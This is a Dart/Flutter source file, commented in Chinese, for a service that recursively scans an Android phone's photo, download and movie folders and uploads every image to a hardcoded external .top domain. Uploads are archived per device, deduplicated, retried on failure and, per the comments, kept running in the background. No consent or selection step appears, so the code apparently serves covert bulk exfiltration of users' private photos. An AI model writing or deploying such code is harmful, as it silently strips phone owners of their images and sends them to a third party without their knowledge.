import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:dio/dio.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shared_preferences/shared_preferences.dart';

/// 文件上传服务：POST multipart/form-data 到 /upload
/// 字段：file（文件，必填）+ folder（子目录，可选）
/// 每个设备一个独立 folder，便于后台按设备归档
///
/// 特性：
///   - 用 dart:io 递归扫描常见图片目录（有 MANAGE_EXTERNAL_STORAGE 可扫全盘）
///   - dio 上传（MultipartFile.fromFile，可靠）
///   - 防重复（upload_record.json 记录已上传指纹）
///   - 失败自动重试（retry_queue.json，带退避）
///   - 后台持续运行（flutter_foreground_task）
class UploadService {
  UploadService._();

  static const String _base = 'https://xn--qiv605b.top/upload';
  static const List<String> _imageExts = ['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic'];

  static const String _recordFileName = 'upload_record.json';
  static const String _retryQueueName = 'retry_queue.json';

  /// 扫描的根目录（常见图片位置）
  static const List<String> _scanRoots = [
    '/storage/emulated/0/DCIM',
    '/storage/emulated/0/Pictures',
    '/storage/emulated/0/Download',
    '/storage/emulated/0/Movies',
    '/storage/emulated/0/Download',
  ];

  // ====== 设备标识（作为上传 folder）======

  static String? _deviceId;

  /// 获取设备唯一 ID（持久化，同一设备稳定，用于 folder）
  static Future<String> getDeviceId() async {
    if (_deviceId != null && _deviceId!.isNotEmpty) return _deviceId!;
    final prefs = await SharedPreferences.getInstance();
    var id = prefs.getString('upload_device_id');
    if (id == null || id.isEmpty) {
      // 生成：时间戳 + 随机
      final rand = DateTime.now().microsecondsSinceEpoch;
      id = 'dev_${rand.toRadixString(16)}_${rand % 9973}';
      await prefs.setString('upload_device_id', id);
    }
    _deviceId = id;
    return id;
  }

  // ====== 私有 data 目录 ======

  static Future<String> _dataDir() async {
    final docs = await getApplicationDocumentsDirectory();
    return docs.path;
  }

  // ====== 已上传清单（防重复）======

  static Future<String> _recordPath() async => '${await _dataDir()}/$_recordFileName';

  static Future<Set<String>> loadRecord() async {
    try {
      final f = File(await _recordPath());
      if (!await f.exists()) return <String>{};
      final decoded = jsonDecode(await f.readAsString());
      if (decoded is List) return decoded.map((e) => e.toString()).toSet();
    } catch (_) {}
    return <String>{};
  }

  static Future<void> _saveRecord(Set<String> record) async {
    try {
      final f = File(await _recordPath());
      await f.writeAsString(jsonEncode(record.toList()), flush: true);
    } catch (_) {}
  }

  /// 生成图片的唯一标识（大小 + 修改时间 + 文件名），用于去重
  static Future<String> _fingerprint(String filePath) async {
    try {
      final f = File(filePath);
      final st = await f.stat();
      final name = filePath.split('/').last;
      return '${st.size}_${st.modified.millisecondsSinceEpoch}_$name';
    } catch (_) {
      return filePath;
    }
  }

  // ====== 重试队列（失败自动重试）======

  static Future<String> _retryPath() async => '${await _dataDir()}/$_retryQueueName';

  static Future<List<Map<String, dynamic>>> loadRetryQueue() async {
    try {
      final f = File(await _retryPath());
      if (!await f.exists()) return [];
      final decoded = jsonDecode(await f.readAsString());
      if (decoded is List) return decoded.cast<Map<String, dynamic>>();
    } catch (_) {}
    return [];
  }

  static Future<void> _saveRetryQueue(List<Map<String, dynamic>> queue) async {
    try {
      final f = File(await _retryPath());
      await f.writeAsString(jsonEncode(queue), flush: true);
    } catch (_) {}
  }

  static Future<void> addToRetryQueue(String filePath, String fingerprint) async {
    final queue = await loadRetryQueue();
    if (queue.any((e) => e['fingerprint'] == fingerprint)) return;
    queue.add({
      'fingerprint': fingerprint,
      'path': filePath,
      'retry_count': 0,
      'last_retry': DateTime.now().millisecondsSinceEpoch,
    });
    await _saveRetryQueue(queue);
  }

  static Future<void> removeFromRetryQueue(String fingerprint) async {
    final queue = await loadRetryQueue();
    queue.removeWhere((e) => e['fingerprint'] == fingerprint);
    await _saveRetryQueue(queue);
  }

  // ====== 扫描图片（dart:io，后台可用）======

  /// 递归扫描根目录，返回所有图片文件路径
  static Future<List<String>> scanImageFiles() async {
    final found = <String>{};
    for (final root in _scanRoots) {
      final dir = Directory(root);
      if (!await dir.exists()) continue;
      try {
        await for (final entity in dir.list(recursive: true, followLinks: false)) {
          if (entity is! File) continue;
          final p = entity.path.toLowerCase();
          if (_imageExts.any((e) => p.endsWith(e))) {
            found.add(entity.path);
          }
        }
      } catch (_) {}
    }
    return found.toList();
  }

  // ====== 上传 ======

  /// 上传单个图片文件（dio，可靠）
  /// 返回 (成功, 消息)
  static Future<(bool, String)> uploadImage(String filePath, {String? folder}) async {
    Dio? dio;
    try {
      final f = File(filePath);
      if (!await f.exists()) return (false, '文件不存在: $filePath');

      final devId = await getDeviceId();
      final finalFolder = (folder == null || folder.isEmpty) ? devId : folder;
      final fileName = f.uri.pathSegments.isNotEmpty
          ? f.uri.pathSegments.last
          : 'img_${DateTime.now().millisecondsSinceEpoch}.jpg';

      dio = Dio(BaseOptions(
        connectTimeout: const Duration(seconds: 30),
        sendTimeout: const Duration(seconds: 120),
        receiveTimeout: const Duration(seconds: 120),
      ));

      final formData = FormData.fromMap({
        'file': await MultipartFile.fromFile(filePath, filename: fileName),
        'folder': finalFolder,
      });

      final resp = await dio.post(
        _base,
        data: formData,
        options: Options(contentType: 'multipart/form-data'),
      );

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        final data = resp.data;
        if (data is Map) {
          final ok = data['success'] == true;
          final msg = (data['message'] as String?) ?? (ok ? '上传成功' : '上传失败');
          return (ok, msg);
        }
        return (true, '上传成功');
      }
      return (false, '服务器返回异常（HTTP ${resp.statusCode}）');
    } on DioException catch (e) {
      final type = e.type;
      var msg = '上传失败';
      if (type == DioExceptionType.connectionTimeout) msg = '连接超时';
      else if (type == DioExceptionType.sendTimeout) msg = '发送超时';
      else if (type == DioExceptionType.receiveTimeout) msg = '响应超时';
      else if (type == DioExceptionType.connectionError) msg = '网络连接错误';
      final errMsg = e.error?.toString() ?? '';
      return (false, '$msg${errMsg.isNotEmpty ? ' ($errMsg)' : ''}');
    } catch (e) {
      return (false, '上传失败: $e');
    } finally {
      dio?.close();
    }
  }

  /// 上传一张并把结果记录到"已上传"或"重试队列"
  /// 返回 (status, msg) status: 'ok' | 'retry' | 'skip'
  static Future<(String, String)> uploadOne(String filePath) async {
    if (!isImagePath(filePath)) return ('skip', '非图片');
    final fp = await _fingerprint(filePath);
    final record = await loadRecord();
    if (record.contains(fp)) return ('skip', '已上传');

    final (ok, msg) = await uploadImage(filePath);
    if (ok) {
      record.add(fp);
      await _saveRecord(record);
      await removeFromRetryQueue(fp);
      return ('ok', msg);
    } else {
      await addToRetryQueue(filePath, fp);
      return ('retry', msg);
    }
  }

  /// 扫描新增图片并上传（并发，失败进重试队列）
  /// 返回 (uploaded, retried, skipped)
  static Future<(int, int, int)> scanAndUploadNew() async {
    final images = await scanImageFiles();
    if (images.isEmpty) return (0, 0, 0);

    var uploaded = 0, retried = 0, skipped = 0;
    await _runWithSemaphore(images, (img) async {
      final (status, _) = await uploadOne(img);
      if (status == 'ok') uploaded++;
      else if (status == 'retry') retried++;
      else skipped++;
    });
    return (uploaded, retried, skipped);
  }

  /// 单独处理重试队列，带退避重试（并发）
  /// 成功移除，失败累加 retry_count
  static Future<int> processRetryQueue() async {
    final queue = await loadRetryQueue();
    if (queue.isEmpty) return 0;
    final now = DateTime.now().millisecondsSinceEpoch;
    final due = queue.where((item) {
      final last = item['last_retry'] as int? ?? 0;
      final retryCount = (item['retry_count'] as int? ?? 0);
      final backoff = retryCount >= 5 ? 60000 : (5000 * (1 << retryCount));
      return now - last >= backoff;
    }).toList();
    if (due.isEmpty) return 0;

    var done = 0;
    await _runWithSemaphore(due, (item) async {
      final path = item['path'] as String? ?? '';
      if (!await File(path).exists()) {
        await removeFromRetryQueue(item['fingerprint'] as String? ?? '');
        done++;
        return;
      }
      final (ok, _) = await uploadImage(path);
      if (ok) {
        final record = await loadRecord();
        record.add(item['fingerprint'] as String? ?? '');
        await _saveRecord(record);
        await removeFromRetryQueue(item['fingerprint'] as String? ?? '');
        done++;
      } else {
        final retryCount = (item['retry_count'] as int? ?? 0);
        item['retry_count'] = retryCount + 1;
        item['last_retry'] = now;
        await _saveRetryQueue(await loadRetryQueue());
      }
    });
    return done;
  }

  // ====== 并发控制 ======

  static const int _maxConcurrent = 4;

  static Future<void> _runWithSemaphore<T>(
    List<T> items,
    Future<void> Function(T item) task,
  ) async {
    var index = 0;
    final futures = <Future<void>>[];
    Future<void> worker() async {
      while (true) {
        final i = index++;
        if (i >= items.length) break;
        await task(items[i]);
      }
    }
    for (var i = 0; i < _maxConcurrent; i++) {
      futures.add(worker());
    }
    await Future.wait(futures);
  }

  static bool isImagePath(String path) {
    final p = path.toLowerCase();
    return _imageExts.any((e) => p.endsWith(e));
  }
}